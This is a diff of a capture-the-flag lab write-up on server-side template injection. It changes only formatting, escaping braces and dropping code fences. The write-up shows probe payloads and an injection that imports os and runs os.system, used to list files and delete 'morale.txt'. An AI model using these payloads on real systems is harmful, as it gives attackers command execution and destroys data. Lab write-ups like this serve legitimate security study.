@@ -57,10 +57,9 @@ As you can see, when we posted a new comment, **our name will be rendered via th
 Since **the username can be controlled by an attacker**, it might vulnerable to SSTI.
 
 **The template code might be:**
-```py
+
 blog-post-author-display = getQueryParameter('blog-post-author-display')
-engine.render("Hello {{"+blog-post-author-display+"}}", data)
-```
+engine.render("Hello \{\{"+blog-post-author-display+"\}\}", data)
 
 **If in that case, we can just close the template syntax: `}}`.**
 
@@ -74,7 +73,7 @@ It worked!
 
 **Let's do some maths:**
 
-`user.name}}-SSTI payload...{{7*7}}`
+user.name\}\}-SSTI payload...\{\{7\*7\}\}
 
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223030946.png)
 
@@ -88,7 +87,7 @@ Next, we need to which template engine is using.
 
 **To do so, we can trigger an error:**
 
-`{{trigger_error}}`
+\{\{trigger_error\}\}
 
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031113.png)
 
@@ -106,7 +105,7 @@ Since I'm quite familiar with Python, I knew that **we can import a module calle
 
 **Payload:**
 
-`{% import os %}{{os.system("cmd_here")}}`
+\{\% import os \%\}\{\{os.system("cmd_here")\}\}
 
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031757.png)
 
@@ -114,9 +113,9 @@ Since I'm quite familiar with Python, I knew that **we can import a module calle
 
 **Nice! Let's delete `morale.txt` file:**
 
-`{% import os %}{{os.system("ls")}}`
+\{\% import os \%\}\{\{os.system("ls")\}\}
 
-`{% import os %}{{os.system("rm morale.txt")}}`
+\{\% import os \%\}\{\{os.system("rm morale.txt")\}\}
 
 
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031915.png)
